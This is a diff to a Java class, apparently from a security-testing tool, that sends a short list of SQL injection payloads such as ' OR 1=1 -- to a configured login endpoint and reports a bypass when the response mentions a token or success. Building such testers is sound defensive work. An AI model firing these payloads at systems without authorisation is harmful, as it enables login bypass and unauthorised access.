@@ -1,11 +1,13 @@
 package attacks;
 
+import config.AttackConfig;
 import model.AttackResult;
+import model.StrideCategory;
 import util.HttpUtil;
 
 public class SqlInjectionAttack {
 
-    public static AttackResult run(String baseUrl) {
+    public static AttackResult run(AttackConfig config) {
 
         String[] payloads = {
             "' OR 1=1 --",
@@ -16,6 +18,9 @@ public class SqlInjectionAttack {
             "' UNION SELECT NULL--"
         };
 
+        String endpoint = config.loginEndpoint;
+        String url = config.targetUrl + endpoint;
+
         for (String injection : payloads) {
             String payload = String.format("""
             {
@@ -24,24 +29,26 @@ public class SqlInjectionAttack {
             }
             """, injection);
 
-            String response = HttpUtil.post(baseUrl + "/login", payload);
+            String response = HttpUtil.post(url, payload);
 
-            if (response.contains("success") || response.contains("token") || 
+            if (response.contains("success") || response.contains("token") ||
                 response.contains("authenticated")) {
-                
-                String details = String.format("SQL injection successful using payload: '%s'. Response: %s", 
+
+                String details = String.format(
+                    "SQL injection successful using payload: '%s'. Response: %s",
                     injection, truncate(response, 150));
-                    
-                return new AttackResult("SQL Injection", true, details);
+
+                return new AttackResult("SQL Injection", true, details,
+                    StrideCategory.TAMPERING, "SqlInjectionAttack", endpoint);
             }
         }
 
-        return new AttackResult("SQL Injection", false, 
-            "No SQL injection vulnerability detected. Tested " + payloads.length + " payloads");
+        return new AttackResult("SQL Injection", false,
+            "No SQL injection vulnerability detected. Tested " + payloads.length + " payloads",
+            StrideCategory.TAMPERING, "SqlInjectionAttack", endpoint);
     }
 
     private static String truncate(String str, int maxLength) {
-        if (str.length() <= maxLength) return str;
-        return str.substring(0, maxLength) + "...";
+        return str.length() <= maxLength ? str : str.substring(0, maxLength) + "...";
     }
 }
